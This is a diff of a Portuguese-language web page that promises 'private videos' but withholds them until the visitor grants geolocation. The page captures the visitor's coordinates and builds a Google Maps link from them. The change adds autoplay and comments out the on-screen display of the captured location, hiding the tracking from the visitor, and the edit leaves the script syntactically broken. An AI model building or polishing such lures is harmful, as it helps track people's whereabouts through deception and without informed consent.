@@ -73,11 +73,10 @@
   <button onclick="permitir()">Permitir</button>
 </div>
 
-<!-- Vídeo de fundo (sem autoplay) -->
+<!-- Vídeo de fundo (YouTube) -->
 <div id="video-bg">
-  <iframe id="youtube" src="https://www.youtube.com/embed/dQw4w9WgXcQ?controls=1&mute=0&autoplay=0&rel=0&modestbranding=1" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+  <iframe width="100%" height="100%" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 </div>
-
 <!-- Conteúdo principal -->
 <div id="content" style="display: none;">
   <h1>Bem-vindo aos meus Videos privados!</h1>
@@ -146,7 +145,7 @@
       longitude = locResult.longitude;
       googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
       document.getElementById('location').innerText =
-        `Localização: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+        //`Localização: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
     } else {
       document.getElementById('location').innerText =
         "Localização não permitida ou não capturada, por isso video não carregado. Atualize a pagine e permita a o acesso.";
